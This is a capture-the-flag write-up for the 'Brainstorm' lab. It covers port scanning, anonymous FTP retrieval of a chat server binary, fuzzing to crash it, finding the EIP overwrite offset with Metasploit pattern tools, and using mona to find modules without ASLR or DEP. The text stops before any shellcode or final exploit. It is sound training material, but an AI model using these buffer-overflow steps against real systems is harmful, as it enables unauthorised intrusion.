# Brainstorm

Reverse engineer a chat program and write a script to exploit a Windows machine.

Task 1 Deploy Machine and Scan Network

## Q1 How many open ports?

### Answer Q1: 3 from nmap scan

Nmap scan with no ping to determine the ports and services open.
```
root@ip-10-48-97-163:~# nmap -Pn -sV 10.48.172.173
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-21 20:06 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for internal.thm (10.48.172.173)
Host is up (0.00047s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
3389/tcp open  tcpwrapped
9999/tcp open  abyss?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=5/21%Time=6A0F57C4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,52,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter
SF:\x20your\x20username\x20\(max\x2020\x20characters\):\x20")%r(GetRequest
SF:,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x
SF:20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x20mes
SF:sage:\x20")%r(HTTPOptions,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(
SF:beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20character
SF:s\):\x20Write\x20a\x20message:\x20")%r(FourOhFourRequest,63,"Welcome\x2
SF:0to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20usern
SF:ame\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(J
SF:avaRMI,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20e
SF:nter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\
SF:x20message:\x20")%r(GenericLines,63,"Welcome\x20to\x20Brainstorm\x20cha
SF:t\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20ch
SF:aracters\):\x20Write\x20a\x20message:\x20")%r(RTSPRequest,63,"Welcome\x
SF:20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20user
SF:name\x20\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(
SF:RPCCheck,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x2
SF:0enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20
SF:a\x20message:\x20")%r(DNSVersionBindReqTCP,63,"Welcome\x20to\x20Brainst
SF:orm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20\(max\x
SF:2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(DNSStatusReques
SF:tTCP,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPlease\x20ent
SF:er\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write\x20a\x2
SF:0message:\x20")%r(Help,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(bet
SF:a\)\nPlease\x20enter\x20your\x20username\x20\(max\x2020\x20characters\)
SF::\x20Write\x20a\x20message:\x20")%r(SSLSessionReq,63,"Welcome\x20to\x20
SF:Brainstorm\x20chat\x20\(beta\)\nPlease\x20enter\x20your\x20username\x20
SF:\(max\x2020\x20characters\):\x20Write\x20a\x20message:\x20")%r(Terminal
SF:ServerCookie,63,"Welcome\x20to\x20Brainstorm\x20chat\x20\(beta\)\nPleas
SF:e\x20enter\x20your\x20username\x20\(max\x2020\x20characters\):\x20Write
SF:\x20a\x20message:\x20");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Just the three ports
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        Microsoft ftpd
3389/tcp open  tcpwrapped
9999/tcp open  abyss?

### What is abyss on 9999

Nmap found a custom service on port 9999.
It doesn’t know what it is, so it prints the banner and asks if you want to submit it.
In your case, port 9999 is running a custom chat server:
```
Welcome to Brainstorm chat (beta)
...
Please enter your username (max 20 characters):
```
Nmap doesn’t recognise it, so it dumps the fingerprint.

# Task 2 Accessing files

FTP was available on port 21 so first off try anonymous and a few test names

starting with username:password anonymous:anonymous, anonymous worked but not admin:admin and other combinations no success.
```
└─$ ftp THM_Target
Connected to THM_Target.
220 Microsoft FTP Service
Name (THM_Target:hostusername): admin
331 Password required for admin.
Password:
530 User cannot log in.
...
Name (THM_Target:hostusername): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
```
- Tried to access any files but initially download failed when run, requiring 'binary' command to ensure downloads run later with get or mget were successful. 
- 'passive' command required to accept commands first.
- Note: If the files you downloaded from FTP are twice the size, that is a classic symptom of downloading binary files in ASCII mode. Windows executables, DLLs, ZIPs, and any non‑text files get corrupted when transferred in ASCII. This is where binary command ensures downloads are binary not ascii comes useful.
```
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> binary
200 Type set to I.
ftp> ls
200 EPRT command successful.
150 Opening ASCII mode data connection.
08-29-19  08:36PM       <DIR>          chatserver
226 Transfer complete.
ftp> cd chatserver
250 CWD command successful.
ftp> ls
200 EPRT command successful.
150 Opening ASCII mode data connection.
08-29-19  10:26PM                43747 chatserver.exe
08-29-19  10:27PM                30761 essfunc.dll
226 Transfer complete.
ftp> get essfunc.dll
local: essfunc.dll remote: essfunc.dll
200 EPRT command successful.
150 Opening BINARY mode data connection.
100% |***************| 30761       15.91 KiB/s    00:00 ETA
226 Transfer complete.
30761 bytes received in 00:01 (15.89 KiB/s)
ftp> get chatserver.exe
local: chatserver.exe remote: chatserver.exe
200 EPRT command successful.
150 Opening BINARY mode data connection.
100% |***************| 43747       18.45 KiB/s    00:00 ETA
226 Transfer complete.
43747 bytes received in 00:02 (18.09 KiB/s)
ftp> bye
```
mget is if download for many files allowing wild cards like *, or *.txt, *.zip 
```
ftp> mget *
mget chatserver.exe [anpqy?]? y
200 EPRT command successful.
150 Opening BINARY mode data connection.
100% |***************| 43747       18.53 KiB/s    00:00 ETA
226 Transfer complete.
43747 bytes received in 00:02 (18.29 KiB/s)
mget essfunc.dll [anpqy?]? y
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |***************| 30761       16.25 KiB/s    00:00 ETA
226 Transfer complete.
30761 bytes received in 00:01 (16.23 KiB/s)
ftp> 
```
# Task 3:

### Q1: Read description of buffer overflow from the THM module 'Buffer Overflows x86-64). 
Answer: Familiarise with THM buffer overflows module. 

### Q2: After testing for overflow, by entering a large number of characters, determine the EIP offset.
Answer Task 3 Q2: 2012, see below where EIP determined after basic testing on chatserver. 

There are two variables at start you see when chatserver is running first the user name followed by the message sent.

### First test the user name response:

Initial Test of chatserver
- Test name limit with 30 characters. 
- Test message area with long string of A's.

Server Side (Windows 8 – chatserver.exe)
- Server only seemed to accept 24 of the 30 characters sent as name, cutting rest off.
- Server failed and crashed as soon as I went to 2500 A's, was ok with 1000 A's.
 
I will determine the exact point of failure for message variable but here is the output from these tests as observed.

Client Side (Netcat Terminal – Linux)
User name of 30 A's, cut off after 24 characters, and message with 1000 A's normal but crashed when 2500 sent.
```
┌──(hacktopuser㉿hacktop)-[~/Desktop]
└─$ nc 192.168.0.199 9999
Welcome to Brainstorm chat (beta)
Please enter your username (max 20 characters): AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Write a message: AAAAAAAAAAAAAAAAAAAAAAAAA...1000 sent no problem

Fri May 29 03:44:59 2026
AAAAAAAAAAAAAAAAAAAA said: AAAAAAAAAAAAAAAAAAAAAAAAA...1000 sent no problem
```
When 2500 sent automatically crashed no reply
```
Write a message:  AAAAAAAAAAAAAA...total of 2000 sent and server crashed here about like in first send.
```

Server ok, stopped responding as soon as 2500 A's sent no reply received on client end.
```
C:\Users\Administrator\Desktop\binary\chatserver.exe

Chat Server started!
Called essential function dll version 1.00

Waiting for connections.
Received a client connection from 192.168.0.167:52326
Client 192.168.0.167:52326 selected username: AAAAAAAAAAAAAAAAAAAAAAAA
```
### There is a better way to find the EIP

- EIP is the x86 equivalent of rip used with x86-64, its only 4 bytes not 8. Similarly its necessary to overflow into it to replace the return address.

Metasploit pattern tools found in kali installation can help here:
located in: /usr/share/metasploit-framework/tools/exploit/

Tool	              Purpose
pattern_create.rb	  Generates the unique cyclic pattern
pattern_offset.rb	  Finds the exact EIP offset after a crash

Generate a pattern for easier detection of a point using what shows up in EIP to determine the number of bytes required to overflow into the EIP section.

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
This is same as 'msf-pattern_create -l 3000'

Then sent the output from pattern_create.rb to chatserver as message naturally the server crashed. We however populated the EIP with unique characters we can determine location using the pattern_offset.rb file. 

First here is a the immunity debugger Registers section:
- Note EAX where message starts 
- EBX is directly after EIP.
- EIP is 31704330 representing 4 characters:
      0x31 = '1'
      0x70 = 'p'
      0x43 = 'C'
      0x30 = '0'
- Its actually backwards 0Cp1 appears in the message sent.

Bytes required to overflow buffer into EIP can be calculated using:
  ```
  msf-pattern_offset -q 31704330
  ```
It shows that EIP is 2012 bytes location. This was tested dropping in 2012 bytes of A and 4 of B to fill the EIP value.

### Here is the Registers after the dropping the 3000 long character string in message:
```
Registers (FPU)

EAX 0045E5DC ASCII "Aa0aA1aA2aA3aA4aA5aA6aA7aA8aA"
ECX 000520F0
EDX 000000C2
EBX 0040199E ASCII "Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cp0aCq"
ESP 0012FF48
EBP 0040199E
ESI chatserv.0040199E
EDI chatserv.0040199E

EIP 31704330
...
```

This is what was used to generate the 3000 characters, resolve EIP location and payload to test it.
```                                         
...-[~/Desktop]
└─$ msf-pattern_create -l 3000
Aa0Aa1Aa2Aa3Aa4Aa5Aa......further in 2012->0Cp1.......0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9

...-[~/Desktop]
└─$ msf-pattern_offset -q 31704330
[*] Exact match at offset 2012
                                            
...-[~/Desktop]
└─$ python3 -c "print('A'*2012+'B'*4)"     
AAAAAAAAAA......AAAABBBB
```
This effectively showed EIP replaced wtih 42424242 (last 4 B's), with EAX replaced with AAA...

### Q3 Now you know that you can overflow a buffer and potentially control execution, you need to find a function where ASLR/DEP is not enabled. Why not check the DLL file.

Still using Immunity debugger, with the chatserver.exe loaded, in the bottom command bar enter:
```
!mona modules
```
A windows should show results similar to what is listed here, this is also available in file stored in c:\program files(x86)/Immunity Inc/Immunity Debugger/modules.md.
This can be set to location and then run with:
```
!mona config -set workingfolder c:\mona
!mona modules
```
Here is main part of output from run:
```
...
| Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Details                                                                                 |
| ---------- | ---------- | ---------- | ------ | ------- | ----- | ----- | -------- | ------ | --------------------------------------------------------------------------------------- |
| 0x00400000 | 0x00409000 | 0x00009000 | False  | False   | False | False | False    | False  | -1.0- [chatserver.exe] (C:\Users\Administrator\Desktop\binary\chatserver.exe) 0x0       |
| 0x76720000 | 0x76727000 | 0x00007000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [NSI.dll] (C:\Windows\SYSTEM32\NSI.dll) 0x4540                           |
| 0x75bb0000 | 0x75cf0000 | 0x00140000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [KERNEL32.DLL] (C:\Windows\SYSTEM32\KERNEL32.DLL) 0x4140                 |
| 0x76ed0000 | 0x7703e000 | 0x0016e000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll) 0x4140                       |
| 0x767d0000 | 0x768a7000 | 0x000d7000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [KERNELBASE.dll] (C:\Windows\SYSTEM32\KERNELBASE.dll) 0x4140             |
| 0x746c0000 | 0x746ca000 | 0x0000a000 | True   | False   | True  | True  | True     | True   | 6.3.9600.17415 [CRYPTBASE.dll] (C:\Windows\SYSTEM32\CRYPTBASE.dll) 0x4540               |
| 0x75b60000 | 0x75bb0000 | 0x00050000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [WS2_32.dll] (C:\Windows\SYSTEM32\WS2_32.dll) 0x4140                     |
| 0x74660000 | 0x746b4000 | 0x00054000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [bcryptPrimitives.dll] (C:\Windows\SYSTEM32\bcryptPrimitives.dll) 0x41c0 |
| 0x768b0000 | 0x768f1000 | 0x00041000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll) 0x4140                   |
| 0x76040000 | 0x760fa000 | 0x000ba000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [RPCRT4.dll] (C:\Windows\SYSTEM32\RPCRT4.dll) 0x4140                     |
| 0x746d0000 | 0x746ee000 | 0x0001e000 | True   | True    | True  | True  | True     | True   | 6.3.9600.17415 [SspiCli.dll] (C:\Windows\SYSTEM32\SspiCli.dll) 0x4140                   |
| 0x62500000 | 0x6250b000 | 0x0000b000 | False  | False   | False | False | False    | False  | -1.0- [essfunc.dll] (C:\Users\Administrator\Desktop\binary\essfunc.dll) 0x0             |
| 0x76100000 | 0x761c3000 | 0x000c3000 | True   | True    | True  | True  | True     | True   | 7.0.9600.17415 [msvcrt.dll] (C:\Windows\SYSTEM32\msvcrt.dll) 0x4140                     |
----------
```
Here the main one of interest is the chatserver.exe and essfunc.dll
```
| Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Details                                                                                 |
| ---------- | ---------- | ---------- | ------ | ------- | ----- | ----- | -------- | ------ | --------------------------------------------------------------------------------------- |
| 0x00400000 | 0x00409000 | 0x00009000 | False  | False   | False | False | False    | False  | -1.0- [chatserver.exe] (C:\Users\Administrator\Desktop\binary\chatserver.exe) 0x0       |

| 0x62500000 | 0x6250b000 | 0x0000b000 | False  | False   | False | False | False    | False  | -1.0- [essfunc.dll] (C:\Users\Administrator\Desktop\binary\essfunc.dll) 0x0             |
```
Here unlike all other files listed these two all show false for Rebase, SafeSEH, ASLR, CFG, NXCompat, OS DLL. That is exactly what you want in Brainstorm. The ASLR and NXCompat are the main reasons this is possible for this exploit, as will allow JMP ESP used later in exploit.

### What “all FALSE” actually means for your exploit
1. ASLR = False
- The DLL loads at the same address every time.
- You can use hard‑coded return addresses (e.g., JMP ESP).
- Your exploit becomes reliable.
- This is the big one. Without ASLR disabled, you can’t use static ROP gadgets.

2. NXCompat = False
- DEP is not enforced for this module.
- You can execute shellcode directly on the stack.
- No ROP chain needed to bypass DEP.
- Usually always on on 64bit systems.
- This is why Brainstorm lets you use a simple JMP ESP → shellcode payload.

3. SafeSEH = False
- The module does not have a Safe Structured Exception Handler table.
- If the exploit used SEH overwrites, this DLL would be usable.
- Not needed for Brainstorm, but it confirms the DLL is old and unprotected.

4. Rebase = False
- The DLL cannot be relocated.
- It always loads at its preferred base address.
- This pairs with ASLR=False to guarantee stable gadget addresses.

5. CFG = False
- Control Flow Guard is not enabled.
- You can freely redirect execution to any address inside the DLL.
- Modern Windows protections are simply not present.

6. OS DLL = False
- It’s not a Windows system DLL.
- Third‑party DLLs often have no protections, which is why they’re used for exploits.
- This is why Brainstorm tells you to “check the DLL file”.


